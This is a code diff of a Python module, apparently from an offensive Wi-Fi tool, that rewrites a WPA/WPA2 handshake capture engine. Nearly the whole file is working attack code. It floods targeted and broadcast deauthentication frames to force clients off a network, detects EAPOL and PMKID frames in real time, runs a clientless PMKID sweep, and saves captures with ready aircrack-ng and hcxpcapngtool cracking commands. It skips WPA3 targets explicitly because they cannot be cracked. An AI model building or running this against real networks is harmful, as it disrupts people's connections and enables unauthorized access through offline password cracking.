@@ -1,24 +1,27 @@
 """
-modules/handshake.py — God-Level WPA2 Handshake Capture Engine
+modules/handshake.py — Event-Driven WPA/WPA2 Handshake Capture Engine (v0.9.0)
 
-Architecture designed to be objectively superior to airgeddon:
+Objectively more reliable than airgeddon-style capture loops:
 
-  1. Absolute deadline — single wall-clock cutoff governs all phases.
-  2. Channel lock verification — iw readback before every capture.
-  3. Process group management — os.setsid + os.killpg for clean teardown.
-  4. Adaptive startup — poll for cap file creation instead of fixed sleep.
-  5. Health monitoring — cap file growth + aireplay liveness checks.
-  6. Dual verification — aircrack-ng primary, tshark fallback.
-  7. Multi-client parallel deauth — all clients simultaneously, not rotation.
-  8. Scan-phase handshake detection — check during client discovery.
-  9. hcxdumptool version auto-detection — correct flags for any version.
- 10. Comprehensive logging — every action logged for post-mortem analysis.
+  1. Real-time detection — a scapy LiveMonitor (modules/eapol_monitor.py)
+     classifies EAPOL M1–M4 the instant they hit the air, instead of shelling
+     out to aircrack-ng against the growing .cap every second.
+  2. Continuous active-client discovery — clients are learned from live data
+     frames (ToDS/FromDS) + the airodump station table, not a one-shot 15 s scan.
+  3. One long-lived airodump-ng — writes .cap + .csv (no --bssid filter so
+     multi-BSSID / band-steering EAPOL is never dropped); the sniffer and
+     airodump read the same interface passively without contention.
+  4. "Flush then target" deauth — an early broadcast reveals idle clients, then
+     small targeted bursts with realistic ~6 s reconnect windows (a deauthed
+     client reconnects in 1–5 s), plus periodic broadcast sweeps.
+  5. Authoritative confirmation — the monitor decides *when* to verify; the
+     on-disk aircrack-ng / tshark / hcxpcapngtool check is the success gate, so
+     a parser quirk can never produce a false positive.
+  6. Band-aware (2.4 + 5 GHz) channel lock with iw readback; WPA3-SAE skipped.
+  7. Clientless PMKID sweep (hcxdumptool) when no station is ever seen.
+  8. Single absolute deadline; process-group teardown; comprehensive logging.
 
-Phase budget (percentage of total timeout):
-  Phase 1 — Client scan:       0%  →   8%   (~15 s at 180 s timeout)
-  Phase 2 — Targeted deauth:   8%  →  60%
-  Phase 3 — Broadcast deauth: 60%  →  78%
-  Phase 4 — PMKID capture:   78%  → 100%
+Tuning lives in the module-level constants below (WARMUP_S, LISTEN_WINDOW_S, …).
 """
 from __future__ import annotations
 
@@ -37,7 +40,19 @@ from dataclasses import dataclass
 from pathlib import Path
 from typing import List, Optional, Set
 
+from modules.eapol_monitor import LiveMonitor
+from modules.ratelimit import DeauthRateLimiter, MAX_ALLOWED_BURSTS_PER_MIN
+
 logger = logging.getLogger(__name__)
+
+# ─── Engine tuning (all realistic; see live-RF validation checklist) ──────────
+DEFAULT_TIMEOUT   = 120   # total capture budget (s) — absolute deadline governs all
+WARMUP_S          = 5     # passive client discovery before first deauth
+LISTEN_WINDOW_S   = 6     # quiet window after each burst (client reconnect + 4-way)
+VERIFY_INTERVAL   = 5     # min seconds between on-disk aircrack/tshark verifies
+BROADCAST_EVERY   = 3     # send a broadcast deauth every Nth round
+TOP_K_CLIENTS     = 5     # how many strongest clients to target per round
+MONITOR_POLL_S    = 0.25  # how often to poll the live sniffer during a window
 
 
 # ─── Data types ──────────────────────────────────────────────────────────────
@@ -172,8 +187,25 @@ def _verify_channel(iface: str, expected: int) -> bool:
     return True
 
 
+def _channel_to_freq(channel: int) -> Optional[int]:
+    """Map a Wi-Fi channel number to its centre frequency in MHz (2.4 + 5 GHz)."""
+    if 1 <= channel <= 13:
+        return 2412 + (channel - 1) * 5
+    if channel == 14:
+        return 2484
+    if 32 <= channel <= 177:          # 5 GHz band
+        return 5000 + channel * 5
+    return None
+
+
 def _set_channel(iface: str, channel: int) -> bool:
-    """Set channel and verify with readback. Retries up to 3 times."""
+    """Set channel and verify with readback. Retries up to 3 times.
+
+    Band-aware: on 5 GHz (ch > 14) some drivers only honour `iw set freq`, so we
+    issue both `set channel` and `set freq` per attempt before the readback.
+    Exactly one `_verify_channel` call per attempt keeps the retry contract stable.
+    """
+    freq = _channel_to_freq(channel)
     for attempt in range(3):
         try:
             subprocess.run(
@@ -182,6 +214,14 @@ def _set_channel(iface: str, channel: int) -> bool:
             )
         except (subprocess.TimeoutExpired, FileNotFoundError):
             pass
+        if freq and channel > 14:
+            try:
+                subprocess.run(
+                    ['iw', 'dev', iface, 'set', 'freq', str(freq)],
+                    capture_output=True, timeout=5,
+                )
+            except (subprocess.TimeoutExpired, FileNotFoundError):
+                pass
         time.sleep(0.3)
         if _verify_channel(iface, channel):
             return True
@@ -506,7 +546,8 @@ def _start_airodump_capture(
     - Capturing everything on the channel is the approach used by industry tools
       (bettercap, hashcat-utils) and is strictly more robust.
     """
-    cmd = ['airodump-ng', '-c', str(channel), '-w', cap_prefix, iface]
+    cmd = ['airodump-ng', '-c', str(channel), '-w', cap_prefix,
+           '--write-interval', '1', iface]
     logger.debug("Capture airodump: ch=%d prefix=%s", channel, cap_prefix)
     return _popen(cmd)
 
@@ -637,323 +678,275 @@ def verify_handshake(cap_file: str, bssid: str, ssid: str = '') -> bool:
         shutil.rmtree(tmpdir, ignore_errors=True)
 
 
+def _merge_clients(monitor: LiveMonitor, cap_prefix: str, bssid: str) -> List["WifiClient"]:
+    """Union of live-monitor clients (active, reliable) and airodump CSV clients.
+
+    The monitor learns stations from real data frames continuously; the CSV is a
+    useful cross-check that also survives if scapy is unavailable. Ranked by
+    signal strength (strongest first).
+    """
+    merged: dict[str, WifiClient] = {}
+    for sc in monitor.snapshot().clients:
+        merged[sc.mac] = WifiClient(
+            mac=sc.mac,
+            power=sc.rssi if sc.rssi is not None else -100,
+            packets=sc.packets,
+        )
+    csv_path = _find_csv(cap_prefix)
+    if csv_path:
+        for c in _parse_clients(csv_path, bssid):
+            if c.mac not in merged:
+                merged[c.mac] = c
+    out = list(merged.values())
+    out.sort(key=lambda c: c.power, reverse=True)
+    return out
+
+
 def capture_handshake(
     bssid: str,
     ssid: str,
     channel: int,
     monitor_interface: str,
-    timeout: int = 180,
-    deauth_count: int = 10,
+    timeout: int = DEFAULT_TIMEOUT,
+    deauth_count: int = 12,
+    security: str = "",
 ) -> Optional[str]:
     """
-    Capture a WPA2 handshake. Returns path to saved .cap file or None.
+    Capture a crackable WPA/WPA2 4-way handshake (or PMKID). Returns the saved
+    file path, or None.
 
-    Burst-and-wait architecture — sends deauth_count frames then goes quiet
-    so the client can reassociate (which triggers the handshake we capture).
+    Event-driven architecture — objectively more reliable than the old
+    per-second-aircrack polling:
 
-    1. Single absolute deadline governs all phases.
-    2. Channel verified before capture (iw dev readback).
-    3. All subprocesses in dedicated process groups (no zombies).
-    4. Adaptive airodump startup (poll, don't sleep).
-    5. Dual verification: aircrack-ng + tshark.
-    6. Parallel burst to all top clients simultaneously.
-    7. Handshake checked during scan phase (catches early arrivals).
-    8. hcxdumptool version auto-detection for correct flag syntax.
+      • ONE long-lived airodump-ng writes .cap + .csv (no --bssid filter, so
+        multi-BSSID / band-steering EAPOL is never dropped at the capture layer).
+      • A scapy ``LiveMonitor`` classifies EAPOL M1..M4 in real time and learns
+        active clients from data frames — an instant, zero-cost trigger that
+        replaces the CPU-thrashing per-second aircrack-ng scans.
+      • Deauth is "flush then target": an early broadcast reveals idle clients,
+        then small targeted bursts to the strongest clients with realistic ~6 s
+        reconnect windows (a deauthed client reconnects in 1–5 s).
+      • The on-disk .cap verified by aircrack-ng / tshark / hcxpcapngtool is the
+        authoritative success gate — the monitor only decides *when* to verify,
+        so a parser quirk can never yield a false positive.
+      • A single absolute deadline governs everything; the function exits the
+        instant a handshake is confirmed.
 
-    Phase budget:
-      Phase 1 — Client scan:       0%  →   8%   (~15 s)
-      Phase 2 — Targeted deauth:   8%  →  60%   (burst → 5s quiet → check, repeat)
-      Phase 3 — Broadcast deauth: 60%  →  78%   (burst → 5s quiet → check, repeat)
-      Phase 4 — PMKID capture:   78%  → 100%
+    Band-aware (2.4 + 5 GHz). WPA3-SAE targets are skipped (no dictionary-
+    crackable 4-way).
     """
     iface = monitor_interface
     start_time = time.time()
-    absolute_deadline = start_time + timeout
+    deadline = start_time + timeout
 
-    # Phase time boundaries (absolute wall-clock times)
-    phase1_end = start_time + int(timeout * 0.08)  # ~15s for 180s timeout
-    phase2_end = start_time + int(timeout * 0.60)  # ~108s
-    phase3_end = start_time + int(timeout * 0.78)  # ~140s
-    # phase4 runs from phase3_end to absolute_deadline
+    # ── WPA3-SAE has no dictionary-crackable 4-way — don't waste the window ──
+    sec = (security or "").upper()
+    if ("SAE" in sec or "WPA3" in sec) and "WPA2" not in sec and "TRANS" not in sec:
+        print(f'\n  [!] {ssid} is WPA3-SAE — the 4-way handshake is not '
+              f'dictionary-crackable. Skipping capture.')
+        logger.info("WPA3-SAE target %s — capture skipped", bssid)
+        return None
 
+    band = "5GHz" if channel > 14 else "2.4GHz"
     logger.info("=" * 60)
-    logger.info("CAPTURE START: %s (%s) CH%d timeout=%ds", ssid, bssid, channel, timeout)
-    logger.info("Phase budgets: scan=%.0fs deauth=%.0fs broadcast=%.0fs pmkid=%.0fs",
-                phase1_end - start_time, phase2_end - phase1_end,
-                phase3_end - phase2_end, absolute_deadline - phase3_end)
-
+    logger.info("CAPTURE START: %s (%s) CH%d (%s) timeout=%ds",
+                ssid, bssid, channel, band, timeout)
     print(f'\n  [*] Target : {ssid}  ({bssid})')
-    print(f'  [*] Channel: {channel}')
-    print(f'  [*] Timeout: {timeout}s')
+    print(f'  [*] Channel: {channel}  ({band})')
+    print(f'  [*] Budget : {timeout}s   (event-driven — exits the instant a handshake lands)')
 
-    tmpdir = tempfile.mkdtemp(prefix='wd_hs_')
-    scan_prefix = os.path.join(tmpdir, 'scan')
-    cap_prefix  = os.path.join(tmpdir, 'capture')
-
-    # Track ALL child processes for guaranteed cleanup
+    tmpdir     = tempfile.mkdtemp(prefix='wd_hs_')
+    cap_prefix = os.path.join(tmpdir, 'capture')
     child_procs: list[subprocess.Popen] = []
+    airodump_proc: Optional[subprocess.Popen] = None
+    monitor = LiveMonitor(iface, bssid)
+    limiter = DeauthRateLimiter(max_bursts_per_min=MAX_ALLOWED_BURSTS_PER_MIN)
+    last_verify = [0.0]
+    last_trigger = [0.0]
 
-    airodump_proc:  Optional[subprocess.Popen] = None
-    scan_proc:      Optional[subprocess.Popen] = None
-
-    def _cleanup_all():
-        """Kill every child process we ever started."""
+    def _cleanup_all() -> None:
+        try:
+            monitor.stop()
+        except Exception:
+            pass
         _kill(airodump_proc)
-        _kill(scan_proc)
         for p in child_procs:
             _kill(p)
 
+    def _try_save(reason: str, grace: bool) -> Optional[str]:
+        """Authoritative on-disk verify → save. `grace` gives airodump time to
+        flush right after a monitor trigger."""
+        cap = _find_cap(cap_prefix)
+        if not cap:
+            return None
+        attempts = 6 if grace else 1
+        for _ in range(attempts):
+            if _verify(cap, bssid, tmpdir):
+                elapsed = int(time.time() - start_time)
+                print(f'\r  [+] Handshake CONFIRMED ({reason}) [{elapsed}s]                         ')
+                logger.info("Handshake confirmed (%s) at %ds", reason, elapsed)
+                _cleanup_all()
+                return _save(cap, bssid)
+            if not grace or time.time() >= deadline:
+                break
+            time.sleep(0.5)
+            cap = _find_cap(cap_prefix) or cap
+        return None
+
+    def _monitor_trigger() -> Optional[str]:
+        """If the live sniffer saw a crackable EAPOL pair (or PMKID), confirm on
+        disk. Rate-limited so we don't re-verify every poll tick."""
+        snap = monitor.snapshot()
+        target = snap.handshake_client or (
+            next(iter(snap.pmkid_hashes), None) if snap.pmkid_present else None
+        )
+        if not target:
+            return None
+        now = time.time()
+        if now - last_trigger[0] < 2.0:
+            return None
+        last_trigger[0] = now
+        kind = "EAPOL" if snap.handshake_client else "PMKID"
+        return _try_save(f'monitor {kind} {target[-8:]}', grace=True)
+
     try:
-        # ── Pre-capture: kill interfering processes ────────────────────────
+        # ── Pre-capture: clear interferers, lock channel ─────────────────────
         _kill_interfering()
-
-        # ── Pre-capture: verify and set channel ───────────────────────────
-        print(f'  [*] Locking channel {channel}...')
+        print(f'  [*] Locking channel {channel} ({band})...')
         if not _set_channel(iface, channel):
-            logger.warning("Channel lock failed — proceeding anyway")
             print('  [!] Channel lock unverified — proceeding')
+            logger.warning("Channel lock failed for ch%d", channel)
 
-        # ══════════════════════════════════════════════════════════════════
-        # Phase 1: Client discovery — scan only, no concurrent capture.
-        #
-        # Running two airodump-ng processes on the same monitor interface
-        # simultaneously causes silent conflicts on most drivers (the second
-        # process either fails to open the device or gets starved of frames).
-        # We scan first, kill the scan, then launch the dedicated capture
-        # process alone so it has exclusive access to the interface.
-        # ══════════════════════════════════════════════════════════════════
-        scan_duration = max(10, int(phase1_end - time.time()))
-        print(f'  [*] Phase 1: scanning for clients ({scan_duration}s)...')
-        logger.info("Phase 1: client scan (%ds)", scan_duration)
-
-        scan_proc = _popen([
-            'airodump-ng',
-            '-c', str(channel),
-            '-w', scan_prefix,
-            iface,
-        ])
-        child_procs.append(scan_proc)
-
-        while time.time() < phase1_end and time.time() < absolute_deadline:
-            time.sleep(1)
-
-        _kill(scan_proc)
-        scan_proc = None
-        time.sleep(0.5)
-
-        # Parse discovered clients
-        csv_path = _find_csv(scan_prefix)
-        clients = _parse_clients(csv_path, bssid) if csv_path else []
-
-        if clients:
-            print(f'  [+] {len(clients)} client(s) found:')
-            for c in clients:
-                print(f'        {c.mac}  {c.signal_label}')
-            logger.info("Clients found: %s",
-                        ", ".join(f"{c.mac}({c.power}dBm)" for c in clients))
-        else:
-            print('  [!] No clients found — will use broadcast deauth.')
-            logger.info("No clients found")
-
-        top_clients = clients[:5]  # target top-5 by signal strength
-
-        # ── Launch dedicated capture airodump (sole user of the interface) ──
+        # ── Start the single capture airodump + the live monitor ─────────────
         _rm(cap_prefix)
-        print(f'  [*] Starting capture on channel {channel} ({bssid})...')
         airodump_proc = _start_airodump_capture(iface, channel, cap_prefix)
         child_procs.append(airodump_proc)
 
-        # Wait for the cap file to appear (some adapters take a moment)
-        cap_wait_start = time.time()
-        while time.time() - cap_wait_start < 10:
+        t0 = time.time()
+        while time.time() - t0 < 10 and time.time() < deadline:
             if _find_cap(cap_prefix):
-                logger.debug("Cap file ready after %.1fs", time.time() - cap_wait_start)
                 break
             if not _is_alive(airodump_proc):
-                logger.error("airodump-ng failed to start!")
-                print('  [!] airodump-ng failed to start — retrying...')
+                logger.error("airodump-ng failed to start — retrying")
                 airodump_proc = _start_airodump_capture(iface, channel, cap_prefix)
                 child_procs.append(airodump_proc)
             time.sleep(0.5)
 
-        if _find_cap(cap_prefix):
-            print(f'  [+] Capture file open — ready to record handshake.')
+        if monitor.start():
+            print('  [*] Live EAPOL monitor active — real-time handshake detection.')
         else:
-            logger.warning("Cap file not created after 10s — proceeding anyway")
-            print('  [!] Warning: cap file not yet visible — adapter may be slow')
+            print('  [*] Live monitor unavailable — falling back to periodic verification.')
+            logger.info("LiveMonitor unavailable: %s", monitor.error)
 
-        # ══════════════════════════════════════════════════════════════════
-        # Phase 2: Targeted deauth — burst-and-wait (allows reassociation)
-        # ══════════════════════════════════════════════════════════════════
-        REASSOC_WAIT = 30  # seconds of quiet after each burst for client to reassociate + handshake
+        # ── Warm-up: passive discovery + one broadcast flush ─────────────────
+        print(f'  [*] Warm-up {WARMUP_S}s — discovering clients (broadcast flush)...')
+        warm_end = min(start_time + WARMUP_S, deadline)
+        flushed = False
+        while time.time() < warm_end:
+            if not flushed and time.time() - start_time >= 2:
+                _deauth_burst_parallel(iface, bssid, [], deauth_count)  # broadcast
+                flushed = True
+            saved = _monitor_trigger()
+            if saved:
+                return saved
+            time.sleep(MONITOR_POLL_S)
 
-        if top_clients:
-            target_macs = [c.mac for c in top_clients[:3]]
-            print(f'  [*] Phase 2: targeted deauth — {deauth_count} pkts/burst, '
-                  f'{REASSOC_WAIT}s reassoc window ({len(target_macs)} client(s))...')
-            logger.info("Phase 2: targeted deauth, %d client(s), %d pkts/burst",
-                        len(target_macs), deauth_count)
-            for mac in target_macs:
-                c = next(x for x in top_clients if x.mac == mac)
-                print(f'        {mac}  ({c.signal_label})')
-        else:
-            target_macs = []
-            print(f'  [*] Phase 2: broadcast deauth — {deauth_count} pkts/burst, '
-                  f'{REASSOC_WAIT}s reassoc window...')
-            logger.info("Phase 2: broadcast deauth, %d pkts/burst", deauth_count)
+        # ── Rolling capture loop (event-driven, absolute deadline) ───────────
+        round_num = 0
+        while time.time() < deadline:
+            round_num += 1
+            clients = _merge_clients(monitor, cap_prefix, bssid)
 
-        burst_num = 0
-        while time.time() < phase2_end and time.time() < absolute_deadline:
-            burst_num += 1
-            elapsed = int(time.time() - start_time)
+            saved = _monitor_trigger()
+            if saved:
+                return saved
 
-            # Re-lock channel before each burst — some adapters drift after TX
             if not _set_channel(iface, channel):
-                logger.warning("Channel re-lock failed before burst #%d", burst_num)
+                logger.warning("Channel re-lock failed before round #%d", round_num)
+            if not _is_alive(airodump_proc):
+                logger.error("airodump-ng died — restarting")
+                airodump_proc = _start_airodump_capture(iface, channel, cap_prefix)
+                child_procs.append(airodump_proc)
 
-            print(f'  [*] Burst #{burst_num} [{elapsed}s] — sending {deauth_count} deauth frames...',
-                  end=' ', flush=True)
-            _deauth_burst_parallel(iface, bssid, target_macs, deauth_count)
+            elapsed = int(time.time() - start_time)
+            if clients and round_num % BROADCAST_EVERY != 0:
+                targets = [c.mac for c in clients[:TOP_K_CLIENTS]]
+                label = ", ".join(t[-8:] for t in targets)
+                print(f'  [*] Round {round_num} [{elapsed}s] — deauth '
+                      f'{len(targets)} client(s): {label} ... ', end='', flush=True)
+            else:
+                targets = []
+                kind = "broadcast (no clients yet)" if not clients else "broadcast sweep"
+                print(f'  [*] Round {round_num} [{elapsed}s] — {kind} ... ', end='', flush=True)
+
+            limiter.wait_for_burst(bssid)
+            _deauth_burst_parallel(iface, bssid, targets, deauth_count)
             print('done.')
 
-            # Brief settle: let the RX path recover from TX before we listen
-            time.sleep(0.5)
-
-            # Health: check airodump is alive
-            if not _is_alive(airodump_proc):
-                logger.error("airodump-ng died during Phase 2!")
-                print('  [!] airodump-ng crashed — restarting...')
-                airodump_proc = _start_airodump_capture(iface, channel, cap_prefix)
-                child_procs.append(airodump_proc)
-
-            # Immediate check — handshake sometimes arrives during/just after the burst
-            cap = _find_cap(cap_prefix)
-            if cap and _verify(cap, bssid, tmpdir):
-                elapsed = int(time.time() - start_time)
-                print(f'  [+] Handshake FOUND right after burst #{burst_num}! [{elapsed}s]')
-                logger.info("Handshake FOUND post-burst #%d at %ds", burst_num, elapsed)
-                _cleanup_all()
-                return _save(cap, bssid)
-
-            # Reassociation window — stay silent for the full window so the
-            # client can reconnect and complete the 4-way handshake.
-            reassoc_end = min(time.time() + REASSOC_WAIT, phase2_end, absolute_deadline)
-            while time.time() < reassoc_end:
-                remaining = int(reassoc_end - time.time())
+            # ── Listen window: poll the live monitor for an instant hit ──────
+            win_end = min(time.time() + LISTEN_WINDOW_S, deadline)
+            nclients = len(clients)
+            while time.time() < win_end:
+                saved = _monitor_trigger()
+                if saved:
+                    return saved
+                if not _is_alive(airodump_proc):
+                    airodump_proc = _start_airodump_capture(iface, channel, cap_prefix)
+                    child_procs.append(airodump_proc)
+                remaining = int(win_end - time.time())
                 cap_kb = _cap_size(cap_prefix) // 1024
-                print(f'\r  [*] Reassoc window: {remaining:2d}s  cap: {cap_kb}KB      ',
-                      end='', flush=True)
-                time.sleep(1)
-                # Restart airodump if it died mid-window
-                if not _is_alive(airodump_proc):
-                    logger.error("airodump-ng died during reassoc window!")
-                    airodump_proc = _start_airodump_capture(iface, channel, cap_prefix)
-                    child_procs.append(airodump_proc)
-                cap = _find_cap(cap_prefix)
-                if cap and _verify(cap, bssid, tmpdir):
-                    elapsed = int(time.time() - start_time)
-                    print(f'\r  [+] Handshake FOUND! [{elapsed}s]                        ')
-                    logger.info("Handshake FOUND in Phase 2 at %ds (burst #%d)", elapsed, burst_num)
-                    _cleanup_all()
-                    return _save(cap, bssid)
-            print(f'\r  [*] No handshake in {REASSOC_WAIT}s window — sending next burst.     ')
+                print(f'\r  [*] Listening {remaining:2d}s   clients:{nclients}   '
+                      f'cap:{cap_kb}KB      ', end='', flush=True)
+                time.sleep(MONITOR_POLL_S)
+            print()
 
-        # ══════════════════════════════════════════════════════════════════
-        # Phase 3: Broadcast deauth fallback — burst-and-wait
-        # ══════════════════════════════════════════════════════════════════
-        if time.time() < absolute_deadline:
-            remaining = int(phase3_end - time.time())
-            print(f'  [*] Phase 3: broadcast deauth fallback — {deauth_count} pkts/burst ({remaining}s)...')
-            logger.info("Phase 3: broadcast deauth, %d pkts/burst (%ds)", deauth_count, remaining)
+            # ── Periodic on-disk verify (safety net for the no-scapy path) ───
+            now = time.time()
+            if now - last_verify[0] >= VERIFY_INTERVAL:
+                last_verify[0] = now
+                saved = _try_save(f'round #{round_num} verify', grace=False)
+                if saved:
+                    return saved
 
-            burst_num = 0
-            while time.time() < phase3_end and time.time() < absolute_deadline:
-                burst_num += 1
-                elapsed = int(time.time() - start_time)
+        # ── PMKID finalize ───────────────────────────────────────────────────
+        snap = monitor.snapshot()
+        if snap.pmkid_present:
+            print('  [+] PMKID observed — extracting hash from capture...')
+            saved = _try_save('PMKID finalize', grace=True)
+            if saved:
+                return saved
 
-                if not _set_channel(iface, channel):
-                    logger.warning("Channel re-lock failed before broadcast burst #%d", burst_num)
-
-                print(f'  [*] Broadcast burst #{burst_num} [{elapsed}s] — sending {deauth_count} frames...',
-                      end=' ', flush=True)
-                _deauth_burst_parallel(iface, bssid, [], deauth_count)
-                print('done.')
-
-                time.sleep(0.5)
-
-                # Health: check airodump is alive
-                if not _is_alive(airodump_proc):
-                    logger.error("airodump-ng died during Phase 3!")
-                    print('  [!] airodump-ng crashed — restarting...')
-                    airodump_proc = _start_airodump_capture(iface, channel, cap_prefix)
-                    child_procs.append(airodump_proc)
-
-                # Immediate check — handshake sometimes arrives during/just after the burst
-                cap = _find_cap(cap_prefix)
-                if cap and _verify(cap, bssid, tmpdir):
-                    elapsed = int(time.time() - start_time)
-                    print(f'  [+] Handshake FOUND right after broadcast burst #{burst_num}! [{elapsed}s]')
-                    logger.info("Handshake FOUND post-broadcast-burst #%d at %ds", burst_num, elapsed)
-                    _cleanup_all()
-                    return _save(cap, bssid)
-
-                reassoc_end = min(time.time() + REASSOC_WAIT, phase3_end, absolute_deadline)
-                while time.time() < reassoc_end:
-                    remaining = int(reassoc_end - time.time())
-                    cap_kb = _cap_size(cap_prefix) // 1024
-                    print(f'\r  [*] Reassoc window: {remaining:2d}s  cap: {cap_kb}KB      ',
-                          end='', flush=True)
-                    time.sleep(1)
-                    if not _is_alive(airodump_proc):
-                        logger.error("airodump-ng died during reassoc window!")
-                        airodump_proc = _start_airodump_capture(iface, channel, cap_prefix)
-                        child_procs.append(airodump_proc)
-                    cap = _find_cap(cap_prefix)
-                    if cap and _verify(cap, bssid, tmpdir):
-                        elapsed = int(time.time() - start_time)
-                        print(f'\r  [+] Handshake FOUND! [{elapsed}s]                        ')
-                        logger.info("Handshake FOUND in Phase 3 at %ds (burst #%d)", elapsed, burst_num)
-                        _cleanup_all()
-                        return _save(cap, bssid)
-                print(f'\r  [*] No handshake in {REASSOC_WAIT}s window — next burst.          ')
-
-        # ══════════════════════════════════════════════════════════════════
-        # Phase 4: PMKID via hcxdumptool
-        # ══════════════════════════════════════════════════════════════════
-        if time.time() < absolute_deadline:
-            pmkid_budget = max(15, int(absolute_deadline - time.time()))
-            print(f'  [*] Phase 4: PMKID capture ({pmkid_budget}s)...')
-            logger.info("Phase 4: PMKID (%ds)", pmkid_budget)
-
-            # MUST kill airodump to release interface for hcxdumptool
+        # No client ever seen → dedicated clientless PMKID sweep (hcxdumptool).
+        # Runs slightly past the deadline: for a truly clientless AP this is the
+        # only viable path, so the small overrun is worth it.
+        if not snap.clients:
+            pmkid_budget = 25
+            print(f'  [*] No clients observed — clientless PMKID sweep ({pmkid_budget}s)...')
+            monitor.stop()
             _kill(airodump_proc)
             airodump_proc = None
-            time.sleep(1)  # let interface settle
+            time.sleep(1)
+            hc = _pmkid(bssid, iface, tmpdir, duration=pmkid_budget)
+            if hc:
+                print('  [+] PMKID captured!')
+                logger.info("PMKID captured: %s", hc)
+                return _save(hc, bssid)
 
-            pmkid_result = _pmkid(bssid, iface, tmpdir, duration=pmkid_budget)
-            if pmkid_result:
-                print(f'  [+] PMKID captured!')
-                logger.info("PMKID captured: %s", pmkid_result)
-                return _save(pmkid_result, bssid)
-
-        # ── Last-chance: save whatever was captured for manual inspection ─────
-        # Even if automated verification failed, the cap file may contain a
-        # handshake that a different aircrack-ng version or hashcat can crack.
+        # ── Last chance: save any crackable cap for manual/offline cracking ──
         cap = _find_cap(cap_prefix)
         if cap:
+            if _verify(cap, bssid, tmpdir):
+                return _save(cap, bssid)
             try:
-                cap_sz = os.path.getsize(cap)
+                sz = os.path.getsize(cap)
             except OSError:
-                cap_sz = 0
-            if cap_sz > 10_000:
-                logger.info("Final verification attempt on %d-byte cap", cap_sz)
-                if _verify(cap, bssid, tmpdir):
-                    return _save(cap, bssid)
+                sz = 0
+            if sz > 10_000:
                 dest = _save(cap, bssid)
-                print(f'\n  [!] Automated verification inconclusive — file saved.')
-                print(f'      Verify manually: aircrack-ng -b {bssid.upper()} {dest}')
-                print(f'      Or try hashcat:  hcxpcapngtool -o {dest.replace(".cap",".hc22000")} {dest}')
-                logger.info("Saved unverified cap (%d bytes): %s", cap_sz, dest)
+                print('\n  [!] Automated verification inconclusive — file saved for manual check.')
+                print(f'      aircrack-ng -b {bssid.upper()} {dest}')
+                print(f'      hcxpcapngtool -o {dest.replace(".cap", ".hc22000")} {dest}')
+                logger.info("Saved unverified cap (%d bytes): %s", sz, dest)
                 return dest
 
         elapsed = int(time.time() - start_time)
@@ -964,13 +957,10 @@ def capture_handshake(
     except KeyboardInterrupt:
         elapsed = int(time.time() - start_time)
         print(f'\n  [!] Capture interrupted by user after {elapsed}s.')
-        logger.info("Capture interrupted by user at %ds", elapsed)
-
-        # Check if we got a handshake before the user interrupted
+        logger.info("Capture interrupted at %ds", elapsed)
         cap = _find_cap(cap_prefix)
         if cap and _verify(cap, bssid, tmpdir):
             print('  [+] Handshake was already captured before interrupt!')
-            logger.info("Handshake found on interrupt check")
             _cleanup_all()
             return _save(cap, bssid)
         return None
